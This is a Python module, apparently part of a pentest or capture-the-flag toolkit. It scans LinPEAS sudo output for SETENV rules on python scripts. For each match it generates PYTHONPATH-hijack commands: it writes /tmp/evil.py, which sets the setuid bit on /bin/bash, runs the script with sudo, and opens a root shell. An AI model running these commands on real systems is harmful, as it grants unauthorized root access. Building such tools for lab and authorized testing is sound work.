"""Detect PYTHONPATH hijack opportunities from sudo SETENV rules in LinPEAS output."""

import os
import re
from typing import Dict, List, Tuple

# Matches a sudo rule line containing a user/host spec: (root), (ALL : ALL), etc.
_SUDO_RULE_HEADER = re.compile(r"\([^)]+\)\s+(.+)")

# Recognizes python binary names: python, python3, python2, python3.11, etc.
_PYTHON_BIN_RE = re.compile(r"python[23]?(?:\.\d+)?$", re.IGNORECASE)


def parse_pythonpath_section(section_text: str) -> List[Tuple[str, str, bool]]:
    """Return (python_path, script_path, nopasswd) tuples for SETENV+python sudo rules."""
    results: List[Tuple[str, str, bool]] = []
    seen: set = set()

    for line in section_text.splitlines():
        m = _SUDO_RULE_HEADER.search(line)
        if not m:
            continue

        rest = m.group(1)
        if "SETENV" not in rest.upper():
            continue

        nopasswd = "NOPASSWD" in rest.upper()

        # Strip all leading flag tokens (SETENV:, NOPASSWD:, PASSWD:, ...)
        # These are all-caps (or mixed-case) words immediately followed by ':'
        cmd = re.sub(r"^(?:[A-Za-z_]+\s*:\s*)*", "", rest).strip()

        parts = cmd.split()
        if len(parts) < 2:
            continue

        python_path = parts[0]
        if not _PYTHON_BIN_RE.match(os.path.basename(python_path)):
            continue

        script_path = parts[1]
        if not script_path.startswith("/"):
            continue

        key = (python_path, script_path)
        if key in seen:
            continue
        seen.add(key)

        results.append((python_path, script_path, nopasswd))

    return results


def generate_commands(python_path: str, script_path: str) -> List[str]:
    """Generate PYTHONPATH hijack exploit steps for the given python binary and script."""
    return [
        f'grep "^import\\|^from" {script_path} 2>/dev/null',
        'echo \'import os; os.system("chmod +s /bin/bash")\' > /tmp/evil.py',
        f"sudo PYTHONPATH=/tmp {python_path} {script_path}",
        "/bin/bash -p",
    ]


def analyze(section_text: str) -> List[Dict]:
    """Analyze sudo section for PYTHONPATH hijack via SETENV+python rules.

    Returns CRITICAL findings for NOPASSWD entries, HIGH for password-required entries.
    """
    findings: List[Dict] = []

    for python_path, script_path, nopasswd in parse_pythonpath_section(section_text):
        severity = "CRITICAL" if nopasswd else "HIGH"
        findings.append({
            "binary": os.path.basename(python_path),
            "full_path": python_path,
            "script": script_path,
            "severity": severity,
            "type": "pythonpath",
            "nopasswd": nopasswd,
            "commands": generate_commands(python_path, script_path),
        })

    return findings


# ── CLI self-test ──────────────────────────────────────────────────────────────

if __name__ == "__main__":
    # Biblioteca / Linux Agency scenario
    SAMPLE = """
Matching Defaults entries for hazel on biblioteca:
    env_reset, mail_badpass

User hazel may run the following commands on biblioteca:
    (root) SETENV: NOPASSWD: /usr/bin/python3 /home/hazel/hasher.py
    (root) NOPASSWD: /usr/bin/vim
    (root) SETENV: /usr/bin/python3 /opt/monitor.py
"""

    print("=== parse_pythonpath_section ===")
    for python_path, script_path, nopasswd in parse_pythonpath_section(SAMPLE):
        print(f"  python={python_path}  script={script_path}  nopasswd={nopasswd}")

    print("\n=== analyze ===")
    for finding in analyze(SAMPLE):
        print(f"[{finding['severity']}] {finding['type']} -> {finding['full_path']} ({finding['script']})")
        for cmd in finding["commands"]:
            print(f"    $ {cmd}")
